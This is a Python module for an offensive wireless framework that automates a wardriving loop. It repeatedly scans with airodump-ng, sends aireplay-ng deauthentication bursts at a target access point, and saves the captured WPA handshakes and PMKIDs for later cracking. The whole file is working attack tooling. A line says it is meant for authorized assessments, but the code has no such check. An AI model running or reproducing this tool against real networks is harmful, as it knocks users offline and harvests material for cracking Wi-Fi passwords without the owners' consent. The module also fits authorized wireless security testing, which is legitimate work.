#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Wardriving deauth/capture loop inspired by hashcatch workflows.

Automates a loop of:
1) passive scan
2) target ranking
3) selective deauth pulse
4) handshake/PMKID capture persistence

Version: 1.0.0
"""

from __future__ import annotations

import logging
import shutil
import subprocess
from pathlib import Path
from typing import List

from wirelessxpl.core.exploit import *
from wirelessxpl.core.os_guard import OSRequirement, requires_os

logger = logging.getLogger(__name__)


@requires_os(OSRequirement.LINUX_ONLY)
class Exploit(Exploit):
    __info__ = {
        "name": "Wardriving Deauth Loop",
        "description": (
            "Automated wardriving pipeline with scan/deauth/capture rotations. "
            "Designed for authorized roaming assessments and handshake collection."
        ),
        "authors": ("André Henrique (@mrhenrike) | União Geek",),
        "references": ("https://github.com/hash3liZer/hashcatch",),
        "devices": ("wifi",),
    }

    interface = OptString("wlan0mon", "Monitor-mode interface")
    target_bssid = OptString("", "Optional fixed BSSID target")
    channel = OptString("", "Optional fixed channel")
    scan_seconds = OptInteger(30, "Passive scan duration per cycle")
    deauth_burst = OptInteger(5, "Deauth frames per cycle")
    cycles = OptInteger(3, "Number of scan/deauth cycles")
    output_dir = OptString(".log", "Output directory for captures")
    dry_run = OptBool(False, "Print commands without executing")

    def _require_tool(self, name: str) -> bool:
        if shutil.which(name):
            return True
        print_error("{} not found in PATH.".format(name))
        return False


    def check(self) -> str:
        """Verify wireless interface is in monitor mode and ready."""
        import shutil
        import subprocess
        iface = getattr(self, "iface", None) or getattr(self, "interface", None) or "wlan0"
        if shutil.which("iwconfig"):
            try:
                out = subprocess.check_output(
                    ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "Monitor" in out:
                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                if "no wireless extensions" not in out.lower():
                    return f"Interface {iface} found but NOT in Monitor mode - run airmon-ng start {iface}"
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("iw"):
            try:
                out = subprocess.check_output(
                    ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if str(iface) in out:
                    return f"Interface {iface} detected via iw - verify monitor mode"
            except Exception:
                pass
        return f"Interface {iface} not found - connect wireless adapter and enable monitor mode"

    def run(self) -> None:
        for tool in ("airodump-ng", "aireplay-ng"):
            if not self._require_tool(tool):
                return

        out = Path(str(self.output_dir))
        out.mkdir(parents=True, exist_ok=True)
        cap_prefix = str(out / "wardrive")

        for i in range(1, int(self.cycles) + 1):
            scan_cmd: List[str] = [
                "sudo", "airodump-ng", self.interface, "-w", cap_prefix, "--output-format", "pcap,csv"
            ]
            if str(self.channel).strip():
                scan_cmd.extend(["-c", str(self.channel).strip()])
            if str(self.target_bssid).strip():
                scan_cmd.extend(["--bssid", str(self.target_bssid).strip()])

            deauth_cmd: List[str] = [
                "sudo", "aireplay-ng", "--deauth", str(self.deauth_burst), self.interface
            ]
            if str(self.target_bssid).strip():
                deauth_cmd.extend(["-a", str(self.target_bssid).strip()])

            print_status("Cycle {}/{}".format(i, self.cycles))
            print_info("Scan command: {}".format(" ".join(scan_cmd)))
            print_info("Deauth command: {}".format(" ".join(deauth_cmd)))

            if self.dry_run:
                continue

            try:
                subprocess.run(scan_cmd, timeout=int(self.scan_seconds), check=False)
            except subprocess.TimeoutExpired:
                pass

            if str(self.target_bssid).strip():
                subprocess.run(deauth_cmd, check=False)

        print_success("Wardriving loop completed. Output prefix: {}".format(cap_prefix))
